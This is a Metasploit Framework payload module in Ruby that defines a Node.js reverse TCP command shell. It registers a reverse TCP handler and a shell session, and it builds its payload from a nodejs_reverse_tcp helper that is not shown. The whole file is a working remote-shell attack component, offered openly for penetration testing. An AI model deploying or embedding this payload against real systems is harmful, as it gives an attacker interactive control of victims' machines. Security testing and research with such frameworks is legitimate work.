##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# It would be better to have a commonjs payload, but because the implementations
# differ so greatly when it comes to require() paths for net modules, we will
# settle for just getting shells on nodejs.

require 'msf/core/payload/nodejs'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module MetasploitModule

  CachedSize = 488

  include Msf::Payload::Single
  include Msf::Payload::NodeJS
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Command Shell, Reverse TCP (via nodejs)',
      'Description'   => 'Creates an interactive shell via nodejs',
      'Author'        => ['RageLtMan', 'joev'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'nodejs',
      'Arch'          => ARCH_NODEJS,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'nodejs',
      'Payload'       => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the JS string to use for execution
  #
  def command_string
    nodejs_reverse_tcp
  end
end
